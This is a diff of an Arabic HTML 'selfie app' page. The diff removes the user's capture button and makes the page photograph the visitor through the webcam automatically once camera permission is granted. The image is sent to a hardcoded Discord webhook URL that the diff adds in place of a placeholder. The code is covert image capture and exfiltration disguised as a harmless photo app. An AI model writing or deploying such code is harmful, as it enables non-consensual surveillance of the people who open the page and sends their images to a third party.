@@ -2,14 +2,12 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تطبيق التقاط الصور الشخصية</title>
+    <title>تطبيق التقاط الصور الشخصية التلقائي</title>
     <style>
         body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
         .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         video, canvas { border: 2px solid #ddd; border-radius: 8px; max-width: 100%; height: auto; background-color: #ccc; }
-        button { padding: 12px 24px; font-size: 16px; margin-top: 15px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; transition: background 0.3s; }
-        .btn-waiting { background-color: #6c757d; color: white; cursor: not-allowed; }
-        .btn-capture { background-color: #28a745; color: white; }
+        .status-message { font-size: 16px; margin-top: 15px; font-weight: bold; color: #333; }
     </style>
 </head>
 <body>
@@ -21,8 +19,8 @@
     <!-- مكان عرض بث الكاميرا -->
     <video id="video" width="400" height="300" autoplay playsinline></video><br>
     
-    <!-- الزر التفاعلي -->
-    <button id="action-btn" class="btn-waiting" disabled>بانتظار السماح بالكاميرا...</button>
+    <!-- نص لحالة المعالجة والإرسال -->
+    <div id="status" class="status-message">بانتظار السماح بالكاميرا...</div>
     
     <!-- عنصر مخفي لمعالجة الصورة -->
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -31,11 +29,11 @@
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const actionButton = document.getElementById('action-btn');
     const instructionText = document.getElementById('instruction');
+    const statusText = document.getElementById('status');
     
     // ضع رابط الـ Webhook الخاص بك هنا
-    const webhookUrl = 'YOUR_WEBHOOK_URL_HERE'; 
+    const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_'; 
 
     // تشغيل طلب الإذن تلقائياً فور تحميل الصفحة
     window.addEventListener('DOMContentLoaded', () => {
@@ -46,21 +44,23 @@
         .then(stream => {
             video.srcObject = stream;
             
-            // تفعيل الزر وتحويله لالتقاط بمجرد موافقة المستخدم في المتصفح
-            actionButton.disabled = false;
-            actionButton.textContent = "اضغط هنا لالتقاط وإرسال الصورة";
-            actionButton.className = "btn-capture";
-            instructionText.textContent = "تم تفعيل الكاميرا بنجاح. اضغط على الزر الأخضر لإرسال صورتك.";
+            instructionText.textContent = "تم تفعيل الكاميرا بنجاح.";
+            statusText.textContent = "جاري التقاط الصورة وإرسالها تلقائياً...";
+
+            // الانتظار قليلاً للتأكد من أن بث الفيديو قد بدأ واستقر (نصف ثانية)
+            video.addEventListener('loadedmetadata', () => {
+                setTimeout(captureAndSend, 500);
+            });
         })
         .catch(err => {
             console.error("خطأ في الوصول للكاميرا: ", err);
-            instructionText.textContent = "فشل تشغيل التطبيق. يرجى إعادة تحميل الصفحة ومنح إذن الكاميرا.";
-            actionButton.textContent = "الكاميرا غير مفعلة";
+            instructionText.textContent = "فشل تشغيل التطبيق.";
+            statusText.textContent = "يرجى إعادة تحميل الصفحة ومنح إذن الكاميرا للمتابعة.";
         });
     });
 
-    // دالة التقاط الصورة والإرسال عند الضغط على الزر الأخضر
-    actionButton.addEventListener('click', () => {
+    // دالة التقاط الصورة والإرسال التلقائي
+    function captureAndSend() {
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
@@ -69,10 +69,7 @@
 
             const formData = new FormData();
             formData.append('files[0]', blob, 'captured-image.png');
-            formData.append('username', 'تطبيق الكاميرا المباشر');
-
-            actionButton.disabled = true;
-            actionButton.textContent = "جاري الإرسال...";
+            formData.append('username', 'تطبيق الكاميرا التلقائي');
 
             fetch(webhookUrl, {
                 method: 'POST',
@@ -80,21 +77,20 @@
             })
             .then(response => {
                 if (response.ok) {
-                    alert("تم إرسال الصورة بنجاح!");
+                    statusText.textContent = "تم التقاط الصورة وإرسالها بنجاح!";
+                    statusText.style.color = "#28a745";
                 } else {
-                    alert("حدث خطأ أثناء الإرسال. تأكد من صحة رابط الـ Webhook.");
+                    statusText.textContent = "حدث خطأ أثناء الإرسال. تأكد من صحة رابط الـ Webhook.";
+                    statusText.style.color = "#dc3545";
                 }
             })
             .catch(error => {
                 console.error("خطأ شبكة:", error);
-                alert("فشل الاتصال بالخادم.");
-            })
-            .finally(() => {
-                actionButton.disabled = false;
-                actionButton.textContent = "اضغط هنا لالتقاط وإرسال الصورة";
+                statusText.textContent = "فشل الاتصال بالخادم أثناء إرسال الصورة.";
+                statusText.style.color = "#dc3545";
             });
         }, 'image/png');
-    });
+    }
 </script>
 
 </body>
